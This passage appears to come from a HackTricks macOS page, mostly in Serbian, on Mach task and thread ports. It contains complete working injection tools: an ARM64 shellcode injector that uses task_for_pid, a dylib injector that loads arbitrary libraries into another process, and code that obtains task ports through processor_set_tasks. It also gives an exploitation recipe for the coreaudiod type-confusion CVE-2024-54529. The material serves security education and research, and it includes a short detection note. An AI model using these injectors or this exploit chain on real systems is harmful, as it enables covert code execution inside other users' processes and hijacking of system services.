Thread-ovi takođe imaju povezane portove, koji su vidljivi iz task-a koji poziva **`task_threads`**, kao i iz procesora pomoću `processor_set_threads`. SEND right nad thread port-om omogućava korišćenje funkcija iz `thread_act` podsistema, kao što su:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Bilo koji thread može dobiti ovaj port pozivanjem **`mach_thread_sef`**.

### Shellcode Injection in thread via Task port

Shellcode možete preuzeti sa:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Kompajlirajte** prethodni program i dodajte **entitlements** da biste mogli da izvršite inject code sa istim korisnikom (u suprotnom ćete morati da koristite **sudo**).<sup>[[3]](#references)</sup>

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Da bi ovo radilo na iOS-u, potreban vam je entitlement `dynamic-codesigning` kako biste mogli da izvršnu memoriju učinite upisivom.

### Dylib Injection in thread via Task port

U macOS-u **threads** se mogu manipulisati putem **Mach-a** ili korišćenjem **posix `pthread` api-ja**. **Thread** koji smo generisali u prethodnoj injekciji generisan je korišćenjem Mach api-ja, tako da **nije usklađen sa posix-om**.

Bilo je moguće **inject-ovati jednostavan shellcode** za izvršavanje komande zato što **nije morao da radi sa posix** usklađenim api-jima, već samo sa Mach-om. **Složenije injekcije** bi zahtevale da **thread** takođe bude **usklađen sa posix-om**.

Zato, da bi se **thread poboljšao**, trebalo bi da pozove **`pthread_create_from_mach_thread`**, što će **kreirati validan pthread**. Zatim bi ovaj novi pthread mogao da **pozove dlopen** kako bi **učitao dylib** iz sistema, pa je umesto pisanja novog shellcode-a za izvršavanje različitih radnji moguće učitati prilagođene biblioteke.<sup>[[2]](#references)</sup>

**Primer dylib-ova** možete pronaći na sledećoj lokaciji (na primer, onaj koji generiše log, koji zatim možete pratiti):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Ovom tehnikom se preuzima thread procesa:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

Pozivanje `task_for_pid` ili `thread_create_*` uvećava brojač u `struct task` strukturi kernela, kojem se može pristupiti iz user mode-a pozivanjem `task_info(task, TASK_EXTMOD_INFO, ...)`

## Exception Ports

Kada dođe do exception-a u thread-u, ovaj exception se šalje na određeni exception port tog thread-a. Ako ga thread ne obradi, šalje se na exception port-ove task-a. Ako ga task ne obradi, šalje se na host port kojim upravlja launchd, gde će biti potvrđen prijem. Ovo se naziva exception triage.

Imajte na umu da će na kraju, ako se report ne obradi pravilno, obično završiti u ReportCrash daemon-u. Međutim, moguće je da drugi thread u istom task-u obradi exception; to rade alati za crash reporting, kao što je `PLCreashReporter`.

## Other Objects

### Clock

Svaki user može da pristupi informacijama o clock-u, međutim za podešavanje vremena ili izmenu drugih postavki neophodan je root.

Za dobijanje informacija moguće je pozvati funkcije iz `clock` subsystem-a, kao što su: `clock_get_time`, `clock_get_attributtes` ili `clock_alarm`\
Za izmenu vrednosti može se koristiti `clock_priv` subsystem sa funkcijama kao što su `clock_set_time` i `clock_set_attributes`

### Processors and Processor Set

Processor API-ji omogućavaju kontrolu jednog logical processor-a pozivanjem funkcija kao što su `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Pored toga, **processor set** API-ji omogućavaju grupisanje više processor-a u jednu grupu. Podrazumevani processor set moguće je dobiti pozivanjem **`processor_set_default`**.\
Ovo su neki zanimljivi API-ji za interakciju sa processor set-om:

- `processor_set_statistics`
- `processor_set_tasks`: Vraća niz send right-ova za sve task-ove unutar processor set-a
- `processor_set_threads`: Vraća niz send right-ova za sve thread-ove unutar processor set-a
- `processor_set_stack_usage`
- `processor_set_info`

Kao što je pomenuto u [**ovoj objavi**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), u prošlosti je ovo omogućavalo zaobilaženje prethodno pomenute zaštite radi dobijanja task port-ova u drugim procesima i njihove kontrole pozivanjem **`processor_set_tasks`**, čime se dobijao host port za svaki proces.<sup>[[10]](#references)</sup>\
Danas je za korišćenje te funkcije potreban root, a ona je zaštićena, tako da ćete moći da dobijete ove port-ove samo za nezaštićene procese.<sup>[[10]](#references)</sup>

Možete pokušati sa:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:<sup>[[9]](#references)</sup>

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; indirektni poziv kroz vtable slot
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [1] [Mach Ports – Darling Docs](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [2] [Code injection on macOS – knight.sc](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [3] [knightsc/inject.c – dlopen dylib injection into a remote Mach task (Gist)](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [4] [Don't talk all at once: Elevating privileges on macOS by audit token spoofing – Sector 7](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [5] [XNU — `osfmk/mach/message.h` (Mach message structures and flags)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/message.h)
- [6] [XNU — `osfmk/mach/mach_port.defs` (port manipulation MIG interface)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/mach_port.defs)
- [7] [XNU — `osfmk/mach/task.defs` (`task_for_pid`, thread/task port operations)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/task.defs)
- [8] [task_get_special_port – MIT Darwin XNU manual](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [9] [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
- [10] [About the processor_set_tasks() access to kernel memory vulnerability – reverse.put.as](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)
- [11] [XNU — `osfmk/ipc/ipc_port.h` (port rights and internals)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/ipc/ipc_port.h)

{{#include ../../../../banners/hacktricks-training.md}}
